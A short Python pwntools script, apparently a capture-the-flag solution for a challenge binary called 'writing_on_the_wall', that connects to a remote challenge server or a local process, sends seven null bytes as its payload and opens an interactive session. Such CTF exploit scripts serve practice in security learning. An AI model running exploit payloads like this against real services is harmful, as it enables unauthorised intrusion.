#!/usr/bin/env python3

from pwn import *

if args.REMOTE:
    r = remote("83.136.248.36", 54178)
elif args.GDB:
    r = gdb.debug("./writing_on_the_wall", "b main")
else:
    r = process("./writing_on_the_wall")

payload = b"\x00" * 7

r.sendline(payload)
r.interactive()
